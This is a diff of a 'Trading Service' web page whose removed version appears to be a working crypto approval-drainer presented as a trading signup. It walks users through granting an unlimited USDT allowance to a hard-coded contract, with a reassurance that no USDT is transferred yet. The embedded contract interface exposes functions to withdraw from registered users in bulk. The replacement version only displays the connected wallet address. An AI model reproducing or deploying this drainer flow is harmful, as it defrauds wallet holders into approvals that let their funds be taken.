@@ -3,380 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trading Service - Register</title>
+    <title>Trading Service</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
         
         .container {
             background: white;
-            padding: 40px;
+            padding: 60px 40px;
             border-radius: 20px;
+            text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 500px;
-            width: 100%;
+            max-width: 400px;
         }
         
         h1 {
             color: #1e293b;
             margin-bottom: 10px;
-            text-align: center;
-            font-size: 32px;
         }
         
-        .subtitle {
+        p {
             color: #64748b;
-            text-align: center;
             margin-bottom: 30px;
-            font-size: 16px;
-        }
-        
-        .step {
-            background: #f8fafc;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-            border-left: 4px solid #3b82f6;
-        }
-        
-        .step h3 {
-            color: #334155;
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-        
-        .step p {
-            color: #64748b;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        
-        .info-box {
-            background: #fef3c7;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 13px;
-            color: #92400e;
-            border: 1px solid #fbbf24;
         }
         
         button {
-            width: 100%;
             background: #3b82f6;
             color: white;
-            padding: 16px;
             border: none;
-            border-radius: 12px;
+            padding: 18px 40px;
             font-size: 18px;
             font-weight: 600;
+            border-radius: 12px;
             cursor: pointer;
-            margin-top: 10px;
-            transition: all 0.3s;
+            width: 100%;
         }
         
         button:hover {
             background: #2563eb;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3);
         }
         
-        button:disabled {
-            background: #94a3b8;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .status {
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 15px;
-            display: none;
+        .wallet-info {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f1f5f9;
+            border-radius: 10px;
+            word-break: break-all;
             font-size: 14px;
+            display: none;
         }
         
-        .status.show {
+        .wallet-info.show {
             display: block;
         }
         
         .success {
-            background: #d1fae5;
-            color: #065f46;
-            border: 2px solid #10b981;
-        }
-        
-        .error {
-            background: #fee2e2;
-            color: #991b1b;
-            border: 2px solid #ef4444;
-        }
-        
-        .info {
-            background: #dbeafe;
-            color: #1e40af;
-            border: 2px solid #3b82f6;
-        }
-        
-        .wallet-info {
-            background: #f1f5f9;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            word-break: break-all;
-        }
-        
-        .hidden {
-            display: none;
+            color: #059669;
+            font-weight: 600;
+            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎯 Trading Service</h1>
-        <p class="subtitle">Join our professional trading platform</p>
-
-        <div class="step">
-            <h3>Step 1: Connect Wallet</h3>
-            <p>Connect your Trust Wallet or MetaMask to get started</p>
-            <div class="info-box">
-                ℹ️ Make sure you're on <strong>BNB Smart Chain</strong> network
-            </div>
-        </div>
-
-        <div class="step">
-            <h3>Step 2: Approve USDT</h3>
-            <p>Grant permission to the smart contract to access your USDT</p>
-            <div class="info-box">
-                ℹ️ This is a one-time approval. No USDT is transferred yet.
-            </div>
-        </div>
-
-        <div class="step">
-            <h3>Step 3: Complete Registration</h3>
-            <p>Finalize your registration and start trading</p>
-        </div>
-
-        <!-- Buttons -->
-        <button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
-        <button id="approveBtn" onclick="approveUSDT()" class="hidden">Approve USDT</button>
-        <button id="registerBtn" onclick="registerUser()" class="hidden">Complete Registration</button>
-
-        <!-- Status Messages -->
-        <div id="status" class="status"></div>
+        <p>Connect your wallet to continue</p>
         
-        <!-- Wallet Info -->
-        <div id="walletInfo" class="wallet-info hidden">
-            <strong>Connected Wallet:</strong><br>
-            <span id="walletAddress"></span>
+        <button id="connectBtn" onclick="connectWallet()">
+            Connect Wallet
+        </button>
+        
+        <div id="walletInfo" class="wallet-info">
+            <div class="success">✅ Connected!</div>
+            <strong>Your Address:</strong><br>
+            <span id="address"></span>
         </div>
     </div>
 
-    <!-- Web3 Library -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    
     <script>
-        // ============================================
-        // CONFIGURATION - UPDATE THIS!
-        // ============================================
-        
-        const CONTRACT_ADDRESS = "0x1eEaBE1196425b0392ebb2B93a80bbb7503e63C4"; // ← PASTE YOUR CONTRACT ADDRESS
-        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-        
-        // Contract ABI - Copy from Remix after compilation
-        const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserDeleted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"UserRegistered","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"Withdrawn","type":"event"},{"inputs":[{"internalType":"address","name":"userAddress","type":"address"}],"name":"deleteUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getAllUsers","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTotalUsers","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserInfo","outputs":[{"internalType":"bool","name":"registered","type":"bool"},{"internalType":"uint256","name":"currentBalance","type":"uint256"},{"internalType":"uint256","name":"withdrawn","type":"uint256"},{"internalType":"uint256","name":"allowance","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getWithdrawnAmount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"registerUser","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"totalWithdrawn","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"userList","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"withdraw","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"withdrawBatch","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawFromAll","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}];
-        
-        // Minimal USDT ABI (just the approve function)
-        const USDT_ABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "spender", "type": "address"},
-                    {"name": "value", "type": "uint256"}
-                ],
-                "name": "approve",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            }
-        ];
-
-        let web3, tradingContract, usdtContract, userAccount;
-
-        // ============================================
-        // CONNECT WALLET
-        // ============================================
-        
         async function connectWallet() {
             try {
-                showStatus('Connecting to wallet...', 'info');
-
-                // Check if Web3 provider exists
-                if (typeof window.ethereum === 'undefined') {
-                    showStatus('❌ No wallet found! Please open this page in Trust Wallet Browser or install MetaMask.', 'error');
+                if (!window.ethereum) {
+                    alert('Please open this page in Trust Wallet Browser');
                     return;
                 }
 
-                // Initialize Web3
-                web3 = new Web3(window.ethereum);
+                // Request wallet connection
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
                 
-                // Request account access
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                // Show connected address
+                document.getElementById('address').textContent = accounts[0];
+                document.getElementById('walletInfo').classList.add('show');
+                document.getElementById('connectBtn').textContent = '✅ Connected';
+                document.getElementById('connectBtn').disabled = true;
                 
-                // Get accounts
-                const accounts = await web3.eth.getAccounts();
-                userAccount = accounts[0];
-
-                // Check if on BSC network (Chain ID 56)
-                const chainId = await web3.eth.getChainId();
-                if (chainId !== 56 && chainId !== '0x38') {
-                    showStatus('⚠️ Please switch to BNB Smart Chain network!', 'error');
-                    return;
-                }
-
-                // Initialize contracts
-                tradingContract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-
-                // Check if already registered
-                const isRegistered = await tradingContract.methods.isRegistered(userAccount).call();
-                
-                if (isRegistered) {
-                    showStatus('✅ You are already registered!', 'success');
-                    document.getElementById('connectBtn').classList.add('hidden');
-                    document.getElementById('walletAddress').textContent = userAccount;
-                    document.getElementById('walletInfo').classList.remove('hidden');
-                    return;
-                }
-
-                // Show wallet info
-                document.getElementById('walletAddress').textContent = userAccount;
-                document.getElementById('walletInfo').classList.remove('hidden');
-
-                // Hide connect button, show approve button
-                document.getElementById('connectBtn').classList.add('hidden');
-                document.getElementById('approveBtn').classList.remove('hidden');
-
-                showStatus('✅ Wallet connected! Now approve USDT spending.', 'success');
             } catch (error) {
-                console.error('Connection error:', error);
-                showStatus('❌ Connection failed: ' + error.message, 'error');
+                alert('Connection failed: ' + error.message);
             }
-        }
-
-        // ============================================
-        // APPROVE USDT
-        // ============================================
-        
-        async function approveUSDT() {
-            try {
-                showStatus('Requesting USDT approval... Check your wallet.', 'info');
-
-                // Unlimited approval (standard practice)
-                const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                
-                // Send approval transaction
-                await usdtContract.methods
-                    .approve(CONTRACT_ADDRESS, maxApproval)
-                    .send({ from: userAccount });
-
-                // Hide approve button, show register button
-                document.getElementById('approveBtn').classList.add('hidden');
-                document.getElementById('registerBtn').classList.remove('hidden');
-
-                showStatus('✅ USDT approved! Now complete your registration.', 'success');
-            } catch (error) {
-                console.error('Approval error:', error);
-                if (error.code === 4001) {
-                    showStatus('❌ You rejected the approval in your wallet.', 'error');
-                } else {
-                    showStatus('❌ Approval failed: ' + error.message, 'error');
-                }
-            }
-        }
-
-        // ============================================
-        // REGISTER USER
-        // ============================================
-        
-        async function registerUser() {
-            try {
-                showStatus('Registering... Check your wallet to confirm.', 'info');
-
-                // Send registration transaction
-                await tradingContract.methods
-                    .registerUser()
-                    .send({ from: userAccount });
-
-                // Hide register button
-                document.getElementById('registerBtn').classList.add('hidden');
-
-                showStatus('🎉 Registration complete! Welcome to the platform!', 'success');
-            } catch (error) {
-                console.error('Registration error:', error);
-                if (error.code === 4001) {
-                    showStatus('❌ You rejected the registration in your wallet.', 'error');
-                } else if (error.message.includes('Already registered')) {
-                    showStatus('ℹ️ You are already registered!', 'info');
-                } else if (error.message.includes('approve USDT first')) {
-                    showStatus('❌ Please approve USDT first!', 'error');
-                    document.getElementById('registerBtn').classList.add('hidden');
-                    document.getElementById('approveBtn').classList.remove('hidden');
-                } else {
-                    showStatus('❌ Registration failed: ' + error.message, 'error');
-                }
-            }
-        }
-
-        // ============================================
-        // HELPER FUNCTIONS
-        // ============================================
-        
-        function showStatus(message, type) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = `status show ${type}`;
-        }
-
-        // Auto-connect if wallet is already connected
-        window.addEventListener('load', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        // Wallet is already connected, auto-initialize
-                        connectWallet();
-                    }
-                } catch (error) {
-                    console.log('Auto-connect failed:', error);
-                }
-            }
-        });
-
-        // Listen for account changes
-        if (typeof window.ethereum !== 'undefined') {
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length > 0) {
-                    window.location.reload();
-                }
-            });
-
-            window.ethereum.on('chainChanged', () => {
-                window.location.reload();
-            });
         }
     </script>
 </body>
